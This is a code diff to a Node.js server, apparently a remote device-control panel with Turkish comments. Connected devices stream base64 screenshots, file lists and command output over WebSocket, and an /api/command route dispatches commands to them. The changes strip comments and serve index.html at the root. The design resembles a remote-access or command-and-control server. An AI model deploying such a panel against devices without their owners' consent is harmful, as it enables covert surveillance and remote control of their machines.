@@ -6,7 +6,7 @@ const path = require('path');
 
 const app = express();
 app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' })); // Büyük veri akışları (ekran görüntüleri) için sınır yükseltildi
+app.use(bodyParser.json({ limit: '50mb' }));
 
 const HTTP_PORT = 3000;
 const WS_PORT = 8080;
@@ -26,7 +26,7 @@ wss.on('connection', (socket, req) => {
         status: "Çevrimiçi",
         lastSeen: Date.now(),
         files: [],
-        currentScreen: "" // Base64 formatında ekran görüntüsü verisi
+        currentScreen: ""
     };
     
     clients.push({ info: clientInfo, socket: socket });
@@ -41,17 +41,15 @@ wss.on('connection', (socket, req) => {
                 target.info.lastSeen = Date.now();
                 target.info.status = "Çevrimiçi";
                 
-                // Gelen verinin tipine göre ayrıştırma
                 if (payload.type === "SCREENSHOT") {
-                    target.info.currentScreen = payload.data; // Base64 string
+                    target.info.currentScreen = payload.data;
                 } else if (payload.type === "FILE_LIST") {
-                    target.info.files = payload.data; // Array of file names/paths
+                    target.info.files = payload.data;
                 } else {
                     target.info.lastResponse = payload.data || message.toString();
                 }
             }
         } catch (e) {
-            // Düz metin yanıtları için fallback
             const target = clients.find(c => c.socket === socket);
             if (target) {
                 target.info.lastSeen = Date.now();
@@ -66,7 +64,6 @@ wss.on('connection', (socket, req) => {
     });
 });
 
-// Aktiflik kontrol döngüsü (Her 10 saniyede bir ping atmayan cihazları kontrol eder)
 setInterval(() => {
     const now = Date.now();
     clients.forEach(c => {
@@ -93,7 +90,10 @@ app.post('/api/command', (req, res) => {
     res.json({ success: true, message: "İşlem cihaza gönderildi." });
 });
 
-app.use(express.static(path.join(__dirname, 'public')));
+// Arayüzü direkt ana dizindeki index.html'den okuyoruz
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 app.listen(HTTP_PORT, () => {
     console.log(`[+] Yönetim Paneli Yayında: http://localhost:${HTTP_PORT}`);
